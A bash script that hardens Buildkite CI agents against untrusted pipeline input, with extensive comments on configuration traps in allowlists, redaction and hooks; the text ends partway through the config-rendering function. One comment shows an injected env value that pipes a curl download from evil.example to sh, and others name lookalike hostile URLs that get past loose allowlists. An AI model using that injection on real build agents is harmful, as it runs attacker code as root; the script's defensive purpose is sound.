#!/usr/bin/env bash
# =============================================================================
# HTH Buildkite Control 2.4: Control Untrusted Input to Pipelines
#   — agent-side enforcement (buildkite-agent.cfg + job/lifecycle hooks)
# Profile Level: L2 (Walk)
# Frameworks: CIS Controls 16.1 | NIST 800-53 SI-10, CM-7
# Source: https://howtoharden.com/guides/buildkite/#24-control-untrusted-input-to-pipelines
#
# This is the ONLY pack for control 2.4. Everything 2.4 asks for lives on the
# agent host: the guide's own Rationale says agent-side controls "are the only
# ones a malicious pipeline.yml cannot switch off", and nothing in Terraform,
# REST or GraphQL reaches any of it. One file, three artifacts:
#   1. a hardened buildkite-agent.cfg (emit or apply, plus a fail-closed audit)
#   2. a `pre-bootstrap` job-admission hook   (runs BEFORE checkout)
#   3. a `pre-command` hook that pins the pipeline-upload secret guard
#
# AGENT MAJOR VERSION: primary target is buildkite-agent **v3** (v3.137.0 read
# at authoring). Every config key below is byte-identical in `main` (4.0.0-beta),
# with ONE divergence that changes behaviour — the pipeline-upload secret guard,
# documented at T7. The generated pre-command hook is correct on both majors.
#
# AUTHORING STATUS: DRIFT-CHECKED-ONLY.
# `buildkite-agent` is not installed in the authoring environment, so nothing
# below was executed here. Nothing below is quoted from documentation either —
# every key, env var, default and interaction was read out of the agent source
# at tag v3.137.0 and cross-checked against `main`, 2026-08-18:
#   clicommand/agent_start.go     :185-195, 615-676, 954-982, 1117-1133, 1281-1302
#   clicommand/global.go          :151-168   (redacted-vars defaults)
#   cliconfig/file.go             :86-148, 150-153  (the config parser itself)
#   clicommand/pipeline_upload.go :86-148, 611-621  (v3) / :86-142, 627-637 (main)
#   internal/redact/redact.go     :20-24, 108-160   (LengthMin, path.Match)
#   internal/job/executor.go      :861-925, 1030-1035, 1173-1183, 1317-1327
#   internal/job/hook/hook.go     :16-36     (hook file resolution)
#   agent/job_runner.go           :493-500, 555-600, 888-897, 909-951
#   agent/run_job.go              :231, 267-279, 299  (validateJobValue: MatchString)
# Env-var semantics ("this value cannot be modified", fork/PR vars) come from
# buildkite.com/docs/pipelines/configure/environment-variables, read the same day.
#
# -----------------------------------------------------------------------------
# ⚠️ T1 — `no-command-eval=true` SILENTLY KILLS YOUR PLUGIN ALLOWLIST
# -----------------------------------------------------------------------------
# agent_start.go, verbatim structure (v3.137.0:954-982, identical on main):
#
#   isSetNoPlugins := c.IsSet("no-plugins")
#   if configFile != nil {
#       if _, exists := configFile.Config["no-plugins"]; exists { isSetNoPlugins = true }
#   }
#   ...
#   // Turning off command eval or local hooks will also turn off plugins unless
#   // `--no-plugins=false` is provided specifically
#   if (cfg.NoCommandEval || cfg.NoLocalHooks) && !isSetNoPlugins {
#       cfg.NoPlugins = true
#   }
#
# Setting EITHER `no-command-eval=true` OR `no-local-hooks=true` forces
# no-plugins ON unless the `no-plugins` key is physically present in the config
# file (or passed on the command line). So the obvious hardened config —
#
#   no-command-eval=true
#   allowed-plugins=^github\.com/acme/.*$
#
# — disables plugins entirely and `allowed-plugins` is dead configuration. The
# agent logs nothing about it, because from its point of view you asked for no
# plugins. To get an allowlist you must write `no-plugins=false` explicitly,
# which is exactly what the `allowlist` posture below does. audit() fails on
# this combination; it is the single most likely way to believe 2.4 is
# implemented when it is not.
#
# The corollary is a real trade, not a formality. The agent's own warning on the
# explicit-enable path reads: "Plugins have been specifically enabled, despite
# no-command-eval being enabled. Plugins can execute arbitrary hooks and
# commands". Plugin hooks are scripts on disk and run as hooks — `no-command-eval`
# only blocks the pipeline's own `command` (executor.go:1317-1327). An allowlisted
# plugin is trusted code. Choose posture `none` when nothing on the agent needs
# plugins; choose `allowlist` when something does and pin it hard (T4).
#
# -----------------------------------------------------------------------------
# ⚠️ T2 — `redacted-vars` IS GLOBS; `allowed-*` IS REGEXES. MIXING THEM UP FAILS
#          IN OPPOSITE DIRECTIONS.
# -----------------------------------------------------------------------------
# redact.MatchAny uses path.Match (redact.go:108-131) — shell-glob semantics,
# full-name match, case-sensitive. A regex in redacted-vars is not an error; it
# just never matches anything, and no secret is ever redacted. FAILS SILENT.
# allowed-plugins / allowed-repositories / allowed-environment-variables are fed
# to regexp.Compile (agent_start.go:1122-1133 for the env-var list, 1281-1302 for
# repositories and plugins); a glob like `*_TOKEN` is an
# invalid regex, the agent calls l.Fatalf and REFUSES TO START. FAILS LOUD.
# validate_globs()/validate_regexes() below reject each kind before you ship it.
#
# -----------------------------------------------------------------------------
# ⚠️ T3 — `redacted-vars` MUST BE APPENDED, NEVER REPLACED, AND HAS A 6-BYTE FLOOR
# -----------------------------------------------------------------------------
# The flag carries NINE built-in defaults (global.go:151-168), not the seven
# some vendor pages list. Writing your own list REPLACES all of them, and the
# two that documentation tends to omit — *_SSH_KEY and *_API_KEY — are the two
# most valuable to keep. merge_redacted_vars() unions your additions onto the
# full built-in nine and audit() fails if any of the nine went missing.
# Second half of the same trap: redact.LengthMin = 6 (redact.go:20-24). A value
# shorter than six bytes is skipped even when its NAME matches. Short tokens,
# 4-digit PINs and the string "none" are never redacted. Redaction is
# defence-in-depth for control 3.5, not a reason to let a secret reach a log.
#
# -----------------------------------------------------------------------------
# ⚠️ T4 — THE ALLOWLIST REGEXES ARE NOT ANCHORED FOR YOU, AT EITHER END
# -----------------------------------------------------------------------------
# The agent compiles them with regexp.Compile (agent_start.go:1281-1302) and then
# tests them with `re.MatchString(jobValue)` (agent/run_job.go:267-279,
# validateJobValue, reached from :231 for the repository and :299 for every
# plugin) — a SUBSTRING search: the pattern may match anywhere inside the
# value. Both ends have to be anchored by hand, and the agent's own flag usage
# strings only get this half right —
# "^git@github.com:buildkite/.*" and "^MYAPP_.*$" and "^buildkite-plugins/.*$"
# are quoted below as the source's examples, not as this pack's advice.
#   * No leading `^`: `github\.com/acme/` matches
#     `https://evil.example/github.com/acme/` — a repository you do not own.
#   * No trailing `$`: `^git@github\.com:acme/app\.git` matches
#     `git@github.com:acme/app.git.evil.example/x` — a prefix of a hostile URL.
# This pack refuses any policy pattern that does not begin with `^` AND end
# with `$`.
#
# Anchoring is necessary, not sufficient. `.*$` is still a wildcard: the fully
# anchored `^git@github\.com:acme/.*$` matches `git@github.com:acme/anything`,
# which is the intent, but it also matches every trailing character a URL can
# legally carry. Where the value's shape is known, bound the class instead of
# reaching for `.*` — `^git@github\.com:acme/[A-Za-z0-9._-]+$` says what you
# actually mean. And escape the dots: an unescaped `.` in `github.com` matches
# any character, so `^git@github.com:acme/.*$` also admits `git@githubXcom:…`.
#
# One asymmetry to know about: RE2's `^`/`$` are TEXT anchors while grep -E's
# are LINE anchors, so a value containing a newline would satisfy the admission
# hook's grep on one of its lines while the agent's own pattern matched none of
# it. The generated hook refuses any value carrying a newline rather than let
# the two disagree.
#
# -----------------------------------------------------------------------------
# ⚠️ T5 — A pre-bootstrap HOOK THAT READS $BUILDKITE_* FAILS OPEN
# -----------------------------------------------------------------------------
# job_runner.go:909-951 builds the pre-bootstrap hook's environment explicitly.
# It contains ONLY: BUILDKITE_ENV_FILE, BUILDKITE_ENV_JSON_FILE, BUILDKITE_JOB_ID,
# BUILDKITE_AGENT_ACCESS_TOKEN, BUILDKITE_AGENT_ENDPOINT, BUILDKITE_NO_HTTP2,
# BUILDKITE_AGENT_DEBUG, BUILDKITE_AGENT_DEBUG_HTTP — plus whatever the agent
# process itself inherited. The JOB's variables are NOT in it. So the natural
# hook body:
#
#   if [ "$BUILDKITE_REPO" != "git@github.com:acme/app.git" ]; then exit 1; fi
#
# compares an EMPTY string, takes the accept path on every job, and admits
# everything while looking like a control. The job env is only available by
# reading the file that BUILDKITE_ENV_JSON_FILE points at.
#
# And it must be READ, never SOURCED. The agent writes the shell-format file
# with `fmt.Fprintf(r.envShellFile, "%s=%q\n", key, value)` (job_runner.go:573)
# — Go %q quoting, NOT shell escaping — and its own comment says the hook
# "should do this validation *without* sourcing the file", because a job env var
# is attacker-supplied (anyone who can open a build can set one in the New Build
# dialog). `source`-ing `FOO="$(curl evil.example|sh)"` executes it as root
# before checkout. The generated hook parses the JSON sibling with jq and never
# sources anything.
#
# -----------------------------------------------------------------------------
# ⚠️ T6 — HOOK PHASE ORDER DECIDES WHO WINS, AND THE REPO GETS A TURN
# -----------------------------------------------------------------------------
# Within every phase the executor runs global -> local -> plugin
# (executor.go:1177-1183). "Local" means `.buildkite/hooks/<name>` INSIDE THE
# CHECKOUT (executor.go:880-884) — attacker-authored on any untrusted branch or
# fork. So anything a global hook exports can be re-exported by the repository's
# own hook moments later, in the same phase.
# Two consequences this pack acts on:
#   * The secret guard belongs in `pre-command`, not `environment`. The
#     `environment` hook fires in setUp before checkout and before plugins
#     (executor.go:1030-1035); `pre-command` is the LAST global hook before the
#     command runs, so it wins against everything that ran earlier — including
#     plugin environment hooks. It cannot win against a repo-supplied local
#     hook, which is the next line of the same phase.
#   * Therefore `no-local-hooks=true` in the config is not optional garnish.
#     It is what makes the pre-command guarantee hold at all (executor.go:910-920
#     "refusing to run %s, local hooks are disabled"). The generated hook also
#     exports BUILDKITE_NO_LOCAL_HOOKS=true as a runtime ratchet — the executor
#     honours that env var and it can only ever disable, never re-enable — but a
#     ratchet applied at pre-command is already too late for the local
#     post-checkout hook. Config is the control; the export is a belt.
#
# -----------------------------------------------------------------------------
# ⚠️ T7 — reject-secrets IS NOT A CONFIG KEY, AND v4 INVERTS IT
# -----------------------------------------------------------------------------
# It is a flag on `buildkite-agent pipeline upload`, never on `agent start`, so
# it can never appear in buildkite-agent.cfg. Putting it there does nothing.
#   v3: --reject-secrets / BUILDKITE_AGENT_PIPELINE_UPLOAD_REJECT_SECRETS,
#       default FALSE. v3.137.0 pipeline_upload.go:620-621 warns and uploads
#       anyway, and says outright "The behaviour in the above flags will become
#       default in Buildkite Agent v4".
#   v4: --reject-secrets is GONE. The field is AllowSecrets, the flag is
#       --allow-secrets / BUILDKITE_AGENT_PIPELINE_UPLOAD_ALLOW_SECRETS, default
#       FALSE, and the check is `if !cfg.AllowSecrets { return error }`. Reject
#       is the default; the flag now UNDOES the control.
# A v3-era `BUILDKITE_AGENT_PIPELINE_UPLOAD_REJECT_SECRETS=true` baked into a
# v4 image is not read by anything — it is inert, not inherited. The generated
# hook sets the v3 variable AND clears the v4 one on every job, which is correct
# on both majors because each ignores the other's variable.
# Setting it as a plain agent-host environment variable is NOT equivalent: that
# name is not one the agent protects (job_runner.go:493-500 only records
# agent-set names in BUILDKITE_IGNORED_ENV), so a pipeline `env:` block can
# override it to false. A pre-command hook export cannot be overridden that way.
#
# -----------------------------------------------------------------------------
# ⚠️ T8 — allowed-environment-variables WITHOUT ITS SWITCH IS A CRASH, NOT A NO-OP
# -----------------------------------------------------------------------------
# agent_start.go:1118: `if len(cfg.AllowedEnvironmentVariables) > 0 &&
# !cfg.EnableEnvironmentVariableAllowList { l.Fatalf(...) }`. The agent exits at
# startup. Under a supervisor that is a restart loop and an outage. The reverse
# is safe and useful: `enable-environment-variable-allowlist=true` alone permits
# only Buildkite-set variables, which is the tightest posture available.
#
# -----------------------------------------------------------------------------
# ⚠️ T9 — "SAFE" IN T8 MEANS THE AGENT STARTS, NOT THAT YOUR PIPELINES STILL RUN
# -----------------------------------------------------------------------------
# The switch-alone posture T8 calls safe is a BREAKING CHANGE on a live agent.
# `enable-environment-variable-allowlist=true` with no list permits only
# Buildkite-set variables, so every pipeline `env:` block and every plugin that
# exports a variable stops taking effect on that host at the next restart. That
# is a legitimate target state; it is not a safe default. This pack therefore
# refuses to reach it by omission — HTH_ALLOWED_ENVIRONMENT_VARIABLES is
# required for emit/apply exactly like the other two policy inputs, and the
# deny-all posture must be written as the literal `NONE`.
#
# The same "starts fine, builds fail" shape applies to no-command-eval. It is
# not only a plugin switch: executor.go:1282-1291 refuses any `command:` whose
# value does not resolve to an existing file INSIDE the checkout —
#   "this agent is not allowed to evaluate console commands; to allow this,
#    re-run the agent without the `--no-command-eval` option or specify a script
#    within your repository to run instead (such as scripts/test.sh)"
# — and a second check refuses a script that resolves outside the checkout dir.
# So every inline `command: make test` step in the org fails on this agent until
# it is moved into a repository script. Stage this pack on a CANARY agent in its
# own queue and drain a representative build set through it before a fleet
# rollout; nothing here can be validated by reading the config file back.
#
# -----------------------------------------------------------------------------
# ⚠️ T10 — buildkite-agent.cfg IS NOT "key=value". AN UNQUOTED '#' TRUNCATES
#           THE VALUE, AND TRUNCATION IS WHAT UN-ANCHORS A PINNED ALLOWLIST.
# -----------------------------------------------------------------------------
# The agent does not parse this file itself; cliconfig/file.go does, and that
# code is copied from godotenv (its own comment says so, file.go:82-85). Before
# it splits key from value it strips comments (file.go:92-112) — everything from
# the first '#' is discarded UNLESS the '#' sits inside a quoted segment:
#
#   allowed-plugins=^github\.com/acme/docker#v1\.2\.3$
#   -> the agent holds     ^github\.com/acme/docker
#
# The trailing '$' is gone, so the pattern is no longer anchored at the end and
# now matches `github.com/acme/docker-evil#anything` and every ref of the real
# plugin. The operator reads a pinned, anchored allowlist in the file and the
# agent enforces a prefix match. This is not an exotic input: allowed-plugins is
# matched against `plugin.FullSource()` (agent/run_job.go:299), which is
# literally `Location + "#" + Version` (go-pipeline plugin.go:65-108), so a '#'
# is what pinning a plugin version LOOKS LIKE. The same applies to
# allowed-repositories for any URL carrying a fragment.
# Two consequences this pack acts on:
#   * Every value is written QUOTED, and set_cfg re-parses the line it is about
#     to write through the port of parseLine below and refuses to write it
#     unless the agent would read back exactly the intended value.
#   * read_cfg returns what the AGENT will hold, not the text on the line, and
#     audit() fails when the two disagree — a sed-based reader cannot see this
#     class of defect at all, so audit would otherwise print the pinned pattern
#     and PASS while the agent enforced the truncated one.
# The quoted form round-trips: file.go:133-145 strips the edge quotes and
# expands \" and \n, so keep quote characters out of policy patterns entirely
# (validate_regexes/validate_globs refuse them).
#
# -----------------------------------------------------------------------------
# ⚠️ T11 — BUILDKITE_PULL_REQUEST_REPO AND BUILDKITE_REPO NAME THE SAME
#           REPOSITORY IN DIFFERENT URL FORMS, SO `!=` MEANS "IS A FORK" NEVER.
# -----------------------------------------------------------------------------
# The docs page above gives these two variables' examples side by side:
#   BUILDKITE_REPO               git@github.com:acme-inc/my-project.git
#   BUILDKITE_PULL_REQUEST_REPO  git://github.com/acme-inc/my-project.git
# — the same repository, one in scp/SSH form and one in git-protocol form. The
# obvious fork test, `[ "$pr_repo" != "$repo" ]`, is therefore TRUE on every
# INTERNAL pull request, and a hook built on it rejects all of them. That fails
# CLOSED, so it is not a hole; it is worse in practice, because a control that
# blocks the org's own pull requests on day one gets ripped back out on day two.
# Setting HTH_ALLOW_FORK_BUILDS=true does not rescue it either — the raw
# `git://` URL then fails an allowlist written as `^git@github\.com:acme/…`.
# The generated hook normalises both values (scheme, userinfo, port and a
# trailing ".git" dropped, host lower-cased) and compares host + path. It still
# matches the ALLOWLIST against the raw value, because that is the text the
# agent's own allowed-repositories is compiled against — so if you enable fork
# builds, HTH_ALLOWED_REPOSITORIES needs a `^git://host/org/…` alternate
# alongside the `^git@` one. install-hooks warns when it does not.
#
# Requires: jq (on the agent host, at job time too), and root write access to
# the agent config and hooks directory. Run ON THE AGENT HOST.
# =============================================================================

set -euo pipefail

# Policy inputs are deliberately given no defaults. An empty allowed-repositories
# is not "no policy configured", it is "every repository on the internet is
# permitted" — the exact silent-failure this control exists to remove.
case "${1:-audit}" in
  emit|apply|install-hooks)
    : "${HTH_ALLOWED_REPOSITORIES:?set HTH_ALLOWED_REPOSITORIES (comma-separated ANCHORED regexes, e.g. '^git@github\.com:acme/[A-Za-z0-9._-]+$,^https://github\.com/acme/[A-Za-z0-9._-]+$')}"
    : "${HTH_ALLOWED_PLUGINS:?set HTH_ALLOWED_PLUGINS (comma-separated ANCHORED regexes, or NONE to forbid plugins entirely)}"
    ;;
esac
# The identical reasoning in the opposite direction (T9). An unset environment
# allowlist would emit the switch with no list, which strips every
# pipeline-supplied variable on this host — the tightest posture, and a breaking
# change for every existing `env:` block and every plugin that sets one. Only
# emit/apply need it; install-hooks writes no config keys.
case "${1:-audit}" in
  emit|apply)
    : "${HTH_ALLOWED_ENVIRONMENT_VARIABLES:?set HTH_ALLOWED_ENVIRONMENT_VARIABLES (comma-separated ANCHORED regexes for job-supplied env vars, e.g. '^MYAPP_.*$', or NONE to permit only Buildkite-set variables — see T9)}"
    ;;
esac

AGENT_CFG="${BUILDKITE_AGENT_CONFIG:-/etc/buildkite-agent/buildkite-agent.cfg}"
HOOKS_PATH="${BUILDKITE_HOOKS_PATH:-/etc/buildkite-agent/hooks}"
# Extra glob patterns appended to the built-in nine. Globs, never regexes (T2).
HTH_EXTRA_REDACTED_VARS="${HTH_EXTRA_REDACTED_VARS:-}"
# Anchored regexes for job-supplied env vars, or the literal NONE for the
# deliberate deny-all. Required for emit/apply by the guard above; the :- here
# only keeps `audit`, `install-hooks` and `help` runnable without it.
HTH_ALLOWED_ENVIRONMENT_VARIABLES="${HTH_ALLOWED_ENVIRONMENT_VARIABLES:-}"
# Fork builds are rejected at admission unless this is exactly "true", in which
# case the fork's repo URL must still satisfy HTH_ALLOWED_REPOSITORIES.
HTH_ALLOW_FORK_BUILDS="${HTH_ALLOW_FORK_BUILDS:-false}"
# When "true" the admission hook demands a 40-hex commit pin on every plugin.
HTH_REQUIRE_PLUGIN_SHA="${HTH_REQUIRE_PLUGIN_SHA:-false}"

# The nine built-in redacted-vars patterns, verbatim from clicommand/global.go.
# Order preserved so a diff against the source stays readable.
AGENT_DEFAULT_REDACTED_VARS='*_PASSWORD,*_SECRET,*_TOKEN,*_PRIVATE_KEY,*_SSH_KEY,*_ACCESS_KEY,*_SECRET_KEY,*_CONNECTION_STRING,*_API_KEY'

# HTH Guide Excerpt: begin config-untrusted-input-agent-cfg
# Emit or apply the hardened buildkite-agent.cfg for an agent pool that runs
# untrusted input, then prove the result actually enforces something.

die() { echo "FATAL: $*" >&2; exit 1; }

# T10: buildkite-agent.cfg is parsed by cliconfig/file.go, a godotenv derivative,
# not by a "split on the first =" reader. These helpers are a faithful port of
# parseLine (v3.137.0:86-148, byte-identical on main) so that this pack writes
# only configs the agent reads back unchanged, and audit only ever reports the
# value the agent will actually enforce.
_HTH_DQ='"'
_HTH_SQ="'"
_HTH_BS='\'

# Occurrences of a single character in a string, without spawning a process.
_hth_count() {
  local s="$1" c="$2" t
  t="${s//"${c}"/}"
  printf '%s' "$(( ${#s} - ${#t} ))"
}

# Given one raw config line, return the value the AGENT will hold for it.
# Empty output means "the agent gets nothing here", which is the fail-closed
# answer for every line parseLine would reject outright.
agent_parse_line() {
  local line="$1" seg rest more kept open out value nd ns
  # file.go:92-112 — strip comments, but keep a '#' inside a quoted segment.
  if [ "${line#*#}" != "${line}" ]; then
    rest="${line}"; kept=0; open=0; out=""
    while :; do
      if [ "${rest#*#}" != "${rest}" ]; then
        seg="${rest%%#*}"; rest="${rest#*#}"; more=1
      else
        seg="${rest}"; more=0
      fi
      nd="$(_hth_count "${seg}" "${_HTH_DQ}")"
      ns="$(_hth_count "${seg}" "${_HTH_SQ}")"
      if [ "${nd}" -eq 1 ] || [ "${ns}" -eq 1 ]; then
        if [ "${open}" -eq 1 ]; then
          open=0
          if [ "${kept}" -eq 0 ]; then out="${seg}"; else out="${out}#${seg}"; fi
          kept=$(( kept + 1 ))
        else
          open=1
        fi
      fi
      if [ "${kept}" -eq 0 ] || [ "${open}" -eq 1 ]; then
        if [ "${kept}" -eq 0 ]; then out="${seg}"; else out="${out}#${seg}"; fi
        kept=$(( kept + 1 ))
      fi
      [ "${more}" -eq 1 ] || break
    done
    line="${out}"
  fi
  # file.go:114-135 — '=' first; ':' only when the line has no '=' at all.
  case "${line}" in
    *=*) value="${line#*=}" ;;
    *:*) value="${line#*:}" ;;
    *)   return 0 ;;
  esac
  value="${value#"${value%%[![:space:]]*}"}"
  value="${value%"${value##*[![:space:]]}"}"
  # file.go:137-145 — exactly two quotes of one kind means the value is quoted:
  # strip every edge quote, then expand \" and \n.
  nd="$(_hth_count "${value}" "${_HTH_DQ}")"
  ns="$(_hth_count "${value}" "${_HTH_SQ}")"
  if [ "${nd}" -eq 2 ] || [ "${ns}" -eq 2 ]; then
    while :; do case "${value}" in [\"\']*) value="${value#?}" ;; *) break ;; esac; done
    while :; do case "${value}" in *[\"\']) value="${value%?}" ;; *) break ;; esac; done
    local _esc_dq="${_HTH_BS}${_HTH_DQ}" _esc_nl="${_HTH_BS}n" _nl
    _nl=$'\n'
    value="${value//"${_esc_dq}"/${_HTH_DQ}}"
    value="${value//"${_esc_nl}"/${_nl}}"
  fi
  printf '%s' "${value}"
}

# True when the pattern ends in a '$' that RE2 will read as an end-of-text
# anchor rather than as a literal dollar sign.
anchored_end() {
  local p="$1" body bs=0
  case "${p}" in *'$') ;; *) return 1 ;; esac
  body="${p%'$'}"
  while [ -n "${body}" ] && [ "${body%"${_HTH_BS}"}" != "${body}" ]; do
    body="${body%"${_HTH_BS}"}"
    bs=$(( bs + 1 ))
  done
  [ $(( bs % 2 )) -eq 0 ]
}

# T4: the agent does not anchor these for you, at either end. Refuse to ship a
# pattern that would match a substring or a prefix of a hostile URL or plugin
# source.
validate_regexes() {
  local label="$1" list="$2" pat
  local IFS=','
  for pat in ${list}; do
    [ -n "${pat}" ] || continue
    # T10: every value is written quoted, and the agent's parser cannot round-trip
    # a quoted value that itself contains a quote character.
    case "${pat}" in
      *'"'*|*"'"*) die "${label}: pattern '${pat}' contains a quote character. buildkite-agent.cfg values are written quoted (T10) and cliconfig/file.go cannot round-trip a nested quote — the agent would compile a different pattern than the one written. Remove it." ;;
    esac
    case "${pat}" in
      '^'*) ;;
      *) die "${label}: pattern '${pat}' is not anchored at the start. regexp.Compile + re.MatchString (run_job.go:267-279) is a substring search, so it would match anywhere in the value — '${pat}' would admit 'https://evil.example/${pat}'. Prefix it with '^'." ;;
    esac
    # T4: the end matters just as much. Without '$' the pattern matches a PREFIX
    # of the value, so '^git@github\.com:acme/app\.git' admits
    # 'git@github.com:acme/app.git.evil.example/x'. A trailing '$' preceded by an
    # ODD number of backslashes is an escaped literal dollar, not an anchor —
    # counting them is the difference between checking for an anchor and
    # checking for a character.
    anchored_end "${pat}" || die "${label}: pattern '${pat}' is not anchored at the end. MatchString matches a prefix, so it would admit '${pat}' followed by anything. Append an unescaped '\$' (and prefer a bounded character class over a trailing '.*' — see T4)."
    # grep -E exits 1 on "no match" (fine) and 2 on a malformed pattern. The
    # agent calls l.Fatalf on a pattern regexp.Compile rejects, so catching it
    # here is the difference between a config error and an agent restart loop.
    if printf '%s' "" | grep -Eq "${pat}" 2>/dev/null; then
      :
    else
      local grc=$?
      [ "${grc}" -le 1 ] || die "${label}: '${pat}' is not a valid regular expression."
    fi
  done
}

# T2: redacted-vars goes through path.Match, so regex metacharacters are matched
# literally and quietly protect nothing.
validate_globs() {
  local label="$1" list="$2" pat
  local IFS=','
  for pat in ${list}; do
    [ -n "${pat}" ] || continue
    case "${pat}" in
      *'"'*|*"'"*) die "${label}: '${pat}' contains a quote character, which cannot survive the quoted write this pack performs (T10)." ;;
    esac
    case "${pat}" in
      *'^'*|*'$'*|*'.*'*|*'\'*)
        die "${label}: '${pat}' looks like a regex. This field is matched with path.Match (globs); a regex here matches nothing and redacts nothing. Use '*_SUFFIX' form." ;;
    esac
  done
}

# The last line that sets ${key}, verbatim. `export ` is tolerated because
# parseLine strips that prefix (file.go:128); a config carrying it would
# otherwise be read by this pack and by the agent as two different files.
cfg_line() {
  [ -r "${AGENT_CFG}" ] || return 1
  sed -nE "/^[[:space:]]*(export[[:space:]]*)?$1[[:space:]]*=/p" "${AGENT_CFG}" | tail -1
}

# What the file APPEARS to say: the text after the first '=', with at most one
# layer of surrounding quotes removed. Only audit uses this, and only to compare
# it against read_cfg — a human reads this, the agent reads read_cfg (T10).
read_cfg_text() {
  local raw
  raw="$(cfg_line "$1")" || return 1
  case "${raw}" in *=*) raw="${raw#*=}" ;; *) raw="" ;; esac
  raw="${raw#"${raw%%[![:space:]]*}"}"
  raw="${raw%"${raw##*[![:space:]]}"}"
  raw="${raw%\"}"; raw="${raw#\"}"
  printf '%s' "${raw}"
}

# What the AGENT will hold. Every decision in this pack is made on this value and
# never on the file text, because an unquoted '#' makes the two differ (T10).
read_cfg() {
  local raw
  raw="$(cfg_line "$1")" || return 1
  agent_parse_line "${raw}"
}

# Delete-then-append rather than sed-substitute: these values are regexes and
# routinely contain the alternation pipe, which would terminate any sed
# replacement delimiter you pick. Only the key is ever interpolated into a
# pattern here; the value is only ever written by printf.
# ATOMIC CONFIG REPLACEMENT. buildkite-agent.cfg carries this host's registration
# token; a truncate-then-write (`cat "${tmp}" >"${AGENT_CFG}"`) interrupted by a
# signal, a full disk, or a set -e abort leaves a config the agent cannot parse,
# the agent then fails to start, and the host silently leaves the fleet. apply
# calls set_cfg once per emitted key, so that window was opened repeatedly in one
# run. Every mutation below stages a sibling file and rename(2)s it into place
# instead, so a reader sees the old config or the new one, never a partial one.
#   * the temp lives in the target's OWN directory — rename(2) is EXDEV across
#     filesystems and mv would fall back to a non-atomic copy
#   * `cp -p` seeds it from the incumbent so mode, ownership and times ride onto
#     the replacement inode; a bare mktemp would hand the agent mktemp's 0600
#   * AGENT_CFG is resolved through symlinks first, because this path is commonly
#     a link into a config-management tree and renaming over the link would
#     replace it with a regular file
#   * no .bak is written: a persistent second copy of the agent token on disk is
#     a worse trade than the failure mode the rename already removes
# The trap is what keeps that staged full copy of the config — token included —
# out of the directory when a run dies mid-mutation.
HTH_CFG_TMP=""
HTH_CFG_DST=""
hth_cfg_cleanup() {
  if [ -n "${HTH_CFG_TMP}" ]; then rm -f "${HTH_CFG_TMP}"; fi
  HTH_CFG_TMP=""
}
trap hth_cfg_cleanup EXIT
trap 'hth_cfg_cleanup; exit 130' INT
trap 'hth_cfg_cleanup; exit 143' TERM

# Real path of the config, following symlinks where the platform's readlink can.
hth_cfg_path() {
  if [ -L "${AGENT_CFG}" ]; then
    readlink -f "${AGENT_CFG}" 2>/dev/null || printf '%s\n' "${AGENT_CFG}"
  else
    printf '%s\n' "${AGENT_CFG}"
  fi
}

# Stage a writable copy beside the target: HTH_CFG_DST is the real path to read
# from and commit to, HTH_CFG_TMP is the staged file to write into.
# This assigns globals rather than printing a value on purpose. Written as
# `dst="$(hth_cfg_stage)"` the function would run in a SUBSHELL, the parent's
# HTH_CFG_TMP would stay empty, and the cleanup trap would never see — or remove
# — the full copy of the token-bearing config that mktemp just created.
hth_cfg_stage() {
  HTH_CFG_DST="$(hth_cfg_path)"
  HTH_CFG_TMP="$(mktemp "$(dirname "${HTH_CFG_DST}")/.hth-bk-cfg.XXXXXX")"
  cp -p "${HTH_CFG_DST}" "${HTH_CFG_TMP}"
}

# Atomic swap. After this returns there is no temp left for the trap to clean up.
hth_cfg_commit() {
  mv -f "${HTH_CFG_TMP}" "${HTH_CFG_DST}"
  HTH_CFG_TMP=""
}

# T10: the value is written QUOTED, and the exact line about to be written is
# fed back through the port of the agent's own parser first. A line the agent
# would read differently from what was intended is never written at all — a
# silently truncated allowlist regex is worse than a refusal, because the file,
# audit and the operator all then agree on a control the agent is not enforcing.
# The staged-and-renamed write above is preserved; only the line changes.
set_cfg() {
  local key="$1" value="$2" tmp dst line effective
  case "${value}" in
    *'"'*|*"'"*) die "${key}: value contains a quote character; cliconfig/file.go cannot round-trip it (T10)." ;;
  esac
  line="$(printf '%s="%s"' "${key}" "${value}")"
  effective="$(agent_parse_line "${line}")"
  [ "${effective}" = "${value}" ] || die "${key}: refusing to write. The agent would read '${effective}' from that line, not '${value}' (T10, cliconfig/file.go:86-148)."
  hth_cfg_stage; dst="${HTH_CFG_DST}"; tmp="${HTH_CFG_TMP}"
  grep -vE "^[[:space:]]*(export[[:space:]]*)?${key}[[:space:]]*=" "${dst}" >"${tmp}" || true
  printf '%s\n' "${line}" >>"${tmp}"
  hth_cfg_commit
}

# T3: union, never replace. Starts from whatever is already on disk if that is
# itself a superset of the built-ins, otherwise from the built-in nine.
merge_redacted_vars() {
  local current extra merged pat seen
  current="$(read_cfg redacted-vars || true)"
  [ -n "${current}" ] || current="${AGENT_DEFAULT_REDACTED_VARS}"
  merged="${AGENT_DEFAULT_REDACTED_VARS}"
  extra="${current},${HTH_EXTRA_REDACTED_VARS}"
  local IFS=','
  for pat in ${extra}; do
    [ -n "${pat}" ] || continue
    seen=0
    case ",${merged}," in *",${pat},"*) seen=1 ;; esac
    [ "${seen}" -eq 1 ] || merged="${merged},${pat}"
  done
  printf '%s' "${merged}"
}

# The config body. Two plugin postures, because T1 makes "allowlist" a different
# file from "none" rather than one extra line.
render_cfg() {
  local redacted plugin_lines env_lines
  redacted="$(merge_redacted_vars)"

  if [ "${HTH_ALLOWED_PLUGINS}" = "NONE" ]; then
    # Written explicitly even though no-command-eval would force it: an implicit
    # value cannot be audited, and a later reviewer must not have to know T1.
    plugin_lines='no-plugins="true"'
  else
    validate_regexes "allowed-plugins" "${HTH_ALLOWED_PLUGINS}"
    plugin_lines="no-plugins=\"false\"
allowed-plugins=\"${HTH_ALLOWED_PLUGINS}\""
  fi

  if [ "${HTH_ALLOWED_ENVIRONMENT_VARIABLES}" = "NONE" ]; then
    # T8/T9: the switch alone is valid and is the tightest posture available —
    # and it strips every pipeline-supplied variable on this host, so reaching it
    # requires writing NONE rather than leaving a variable unset. The list alone
    # is a startup Fatalf, which is why it is never emitted without the switch.
    env_lines='enable-environment-variable-allowlist="true"'
  else
    validate_regexes "allowed-environment-variables" "${HTH_ALLOWED_ENVIRONMENT_VARIABLES}"
    env_lines="enable-environment-variable-allowlist=\"true\"
allowed-environment-variables=\"${HTH_ALLOWED_ENVIRONMENT_VARIABLES}\""
  fi

  validate_regexes "allowed-repositories" "${HTH_ALLOWED_REPOSITORIES}"
